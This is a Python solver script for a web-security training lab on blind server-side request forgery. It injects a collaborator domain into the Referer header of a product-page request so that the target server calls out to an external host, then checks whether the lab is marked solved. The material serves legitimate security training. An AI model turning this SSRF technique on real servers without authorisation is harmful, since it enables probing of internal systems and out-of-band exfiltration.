# Blind SSRF with out-of-band detection

import requests, sys, urllib3, re, time, warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

product_path = '/product?productId=1'


def send_ssrf(url, collab):
	product_url = url + product_path
	headers = {"Referer": "http://" + collab}
	r = requests.get(product_url, headers=headers, verify=False, proxies=proxies)
	if r.status_code == 200:
		print("[+] Successfully sent the request...")
		print("[+] You should Poll Now your collaborator...")
		return r
	else:
		print("[-] Exploit has FAILED to send the request <!>")

def show_usage():
	print("[+] Usage: %s <URL> <COLLAB>" % sys.argv[0])
	print('[+] Example: %s www.example.com anything.oastify.com' % sys.argv[0])
	sys.exit(-1)

def main():
	print('[+] Lab: Blind SSRF with out-of-band detection')
	try:
		url = sys.argv[1].strip()
		collab = sys.argv[2].strip()
	except IndexError:
		show_usage()
	r = requests.get(url, allow_redirects=False, verify=False, proxies=proxies)
	time.sleep(1)
	if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
		print('\n[-] HOST seems to be down (or proxy missconfigued) <!>')
		sys.exit(-1)
	else:
		print("\n[+] Sending Blind SSRF via the Referer header...")
		send_ssrf(url, collab)
		time.sleep(2)
		r = requests.get(url, verify=False, proxies=proxies)
		if 'Congratulations, you solved the lab!' in r.text:
			print('[+] The Lab is solved !')
		else:
			print("[+] The request didn't solve the lab <!>")



if __name__ == "__main__":
	main()